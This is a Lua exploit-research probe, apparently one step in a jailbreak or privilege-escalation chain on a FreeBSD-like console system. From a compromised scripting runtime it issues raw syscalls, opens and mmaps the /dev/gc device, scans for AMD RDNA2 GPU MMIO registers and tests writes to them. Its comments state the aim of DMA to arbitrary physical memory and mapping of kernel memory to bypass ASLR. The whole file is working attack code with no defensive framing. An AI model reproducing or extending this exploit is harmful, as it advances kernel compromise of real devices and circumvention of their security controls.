-- CRASH_CLASS: HIGH
-- PROBE 399d: GPU MMIO register exploration via /dev/gc mmap
--
-- 399c found: mmap(/dev/gc, PROT_RW, MAP_SHARED, offset=0) = valid VA!
-- First dwords read 0xFFFFFFFF — could be unmapped PCIe or reset registers.
-- This probe: map larger regions at different offsets, scan for non-0xFF
-- patterns, try to identify AMD RDNA2 register space.
--
-- If we can access GPU MMIO registers:
-- - SDMA engine registers = DMA to arbitrary physical addresses
-- - GPU page table registers = map kernel physical memory
-- - Both bypass CPU ASLR entirely

print("=== PROBE 399d: GPU MMIO scan ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end)

local sc_open = mk(5)
local sc_close = mk(6)
local sc_mmap = mk(477)
local sc_munmap = mk(73)

local gc_path = memory.alloc(32)
for i = 0, 28, 4 do wd(N(gc_path) + i, 0) end
wd(N(gc_path), 0x7665642F)
wd(N(gc_path) + 4, 0x0063672F)

-- ============================================
-- PART A: Map at offset 0, scan for non-0xFF values
-- ============================================
print("")
print("-- A: offset=0 scan --")

local ok_gc, gc_fd_v = pcall(function()
    return sc_open(uint64(N(gc_path)), uint64(2), uint64(0))
end)
local gc_fd = ok_gc and N(gc_fd_v) or -1
if gc_fd > 10000 then gc_fd = -1 end
print(string.format("gc fd=%d", gc_fd))

if gc_fd >= 0 then
    -- Map 64KB at offset 0
    local ok_m, map_v = pcall(function()
        return sc_mmap(uint64(0), uint64(0x10000), uint64(0x3),
            uint64(0x1), uint64(gc_fd), uint64(0))
    end)
    local mh, ml = 0, 0
    if ok_m and map_v then mh, ml = get_hi_lo(map_v) end
    local mbase = ml + mh * 0x100000000

    if mbase > 0 then
        print(string.format("mapped 64KB at %X_%08X", mh, ml))

        -- Scan every 4 bytes for non-0xFFFFFFFF values
        local non_ff = 0
        local non_zero = 0
        local first_interesting = {}

        for off = 0, 0xFFFC, 4 do
            local v = rd(mbase + off)
            if v == nil then
                -- read failed — crash boundary
                print(string.format("  READ FAIL at +%X", off))
                break
            end
            if v ~= 0xFFFFFFFF then
                non_ff = non_ff + 1
                if v ~= 0 then non_zero = non_zero + 1 end
                if #first_interesting < 20 then
                    table.insert(first_interesting, {off, v})
                end
            end
        end

        print(string.format("  non_FF=%d non_zero=%d of 16384 dwords", non_ff, non_zero))

        for _, entry in ipairs(first_interesting) do
            print(string.format("  +%04X = %08X", entry[1], entry[2]))
        end

        -- Check known AMD register offsets (RDNA2)
        print("  -- known reg offsets --")
        local regs = {
            {0x0000, "MM_INDEX"},
            {0x0004, "MM_DATA"},
            {0x0008, "BIF_DOORBELL"},
            {0x000C, "PCIE_INDEX"},
            {0x0010, "PCIE_DATA"},
            {0x0014, "SMN_INDEX"},
            {0x0018, "SMN_DATA"},
            {0x0030, "HDP_MEM_COHERENCY"},
            {0x0034, "HDP_HOST_PATH_CNTL"},
            {0x0050, "BIF_FB_EN"},
            {0x5000, "GRBM_CNTL"},
            {0x8010, "GRBM_STATUS"},
            {0x8014, "GRBM_STATUS_SE0"},
            {0x8018, "GRBM_STATUS_SE1"},
            {0x8020, "GRBM_STATUS2"},
            {0x8040, "CP_STAT"},
            {0x8048, "CP_STALLED_STAT1"},
            {0xD010, "SDMA0_STATUS"},
            {0xD014, "SDMA0_GFX_RB_CNTL"},
            {0xD018, "SDMA0_GFX_RB_BASE"},
            {0xD01C, "SDMA0_GFX_RB_BASE_HI"},
        }

        for _, r in ipairs(regs) do
            if r[1] < 0x10000 then
                local v = rd(mbase + r[1])
                if v and v ~= 0xFFFFFFFF then
                    print(string.format("  [%04X] %s = %08X ★", r[1], r[2], v))
                end
            end
        end

        -- Write test: can we modify register values?
        print("  -- write test --")
        local test_off = 0x0000  -- MM_INDEX
        local orig = rd(mbase + test_off)
        if orig then
            wd(mbase + test_off, 0x12345678)
            local after = rd(mbase + test_off)
            wd(mbase + test_off, orig or 0)  -- restore
            local restored = rd(mbase + test_off)
            print(string.format("  write: orig=%08X after=%08X restored=%08X",
                orig, after or 0, restored or 0))
            if after == 0x12345678 then
                print("  ★★★ GPU REGISTER WRITE CONFIRMED ★★★")
            elseif after ~= orig then
                print("  ★ VALUE CHANGED (partial write?)")
            end
        end

        pcall(function() sc_munmap(map_v, uint64(0x10000)) end)
    else
        print("mmap failed")
    end
end
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: Try different offsets (skip 64KB chunks)
-- ============================================
print("")
print("-- B: different offsets --")

if gc_fd >= 0 then
    local offsets = {
        0x10000,     -- 64KB
        0x40000,     -- 256KB
        0x100000,    -- 1MB
        0x200000,    -- 2MB
        0x400000,    -- 4MB (typical BAR0 size)
        0x1000000,   -- 16MB
        0x10000000,  -- 256MB (typical VRAM BAR)
    }

    for _, file_off in ipairs(offsets) do
        local ok_b, map_b = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(0x1),
                uint64(0x1), uint64(gc_fd), uint64(file_off))
        end)
        local bh, bl = 0, 0
        if ok_b and map_b then bh, bl = get_hi_lo(map_b) end
        local bbase = bl + bh * 0x100000000

        if bbase > 0 then
            local v0 = rd(bbase)
            local v1 = rd(bbase + 4)
            local v2 = rd(bbase + 8)
            local v3 = rd(bbase + 12)

            local all_ff = (v0 == 0xFFFFFFFF and v1 == 0xFFFFFFFF)
            local all_zero = (v0 == 0 and v1 == 0)

            if v0 ~= nil then
                if not all_ff and not all_zero then
                    print(string.format("  off=%X: %08X %08X %08X %08X ★",
                        file_off, v0, v1 or 0, v2 or 0, v3 or 0))
                elseif all_ff then
                    print(string.format("  off=%X: FF..FF", file_off))
                else
                    print(string.format("  off=%X: 0", file_off))
                end
            else
                print(string.format("  off=%X: read killed", file_off))
            end
            pcall(function() sc_munmap(map_b, uint64(0x4000)) end)
        else
            print(string.format("  off=%X: mmap fail", file_off))
        end

        if not alive() then print("CANARY FAIL off " .. file_off); return end
    end
end

-- ============================================
-- PART C: Large map to find the register space boundary
-- ============================================
print("")
print("-- C: large map boundary scan --")

if gc_fd >= 0 then
    -- Try mapping 4MB (typical BAR0 size)
    local ok_lg, map_lg = pcall(function()
        return sc_mmap(uint64(0), uint64(0x400000), uint64(0x1),
            uint64(0x1), uint64(gc_fd), uint64(0))
    end)
    local lgh, lgl = 0, 0
    if ok_lg and map_lg then lgh, lgl = get_hi_lo(map_lg) end
    local lgbase = lgl + lgh * 0x100000000

    if lgbase > 0 then
        print(string.format("mapped 4MB at %X_%08X", lgh, lgl))

        -- Sample every 64KB
        local transitions = 0
        local prev_pattern = nil
        for chunk = 0, 0x3F0000, 0x10000 do
            local v = rd(lgbase + chunk)
            local pattern
            if v == nil then pattern = "DEAD"
            elseif v == 0xFFFFFFFF then pattern = "FF"
            elseif v == 0 then pattern = "00"
            else pattern = string.format("%08X", v)
            end

            if pattern ~= prev_pattern then
                print(string.format("  +%06X: %s", chunk, pattern))
                transitions = transitions + 1
                prev_pattern = pattern
            end

            if v == nil then break end
        end

        pcall(function() sc_munmap(map_lg, uint64(0x400000)) end)
    else
        print("4MB mmap failed")
    end
end

if gc_fd >= 0 then
    pcall(function() sc_close(uint64(gc_fd)) end)
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 399d COMPLETE ===")
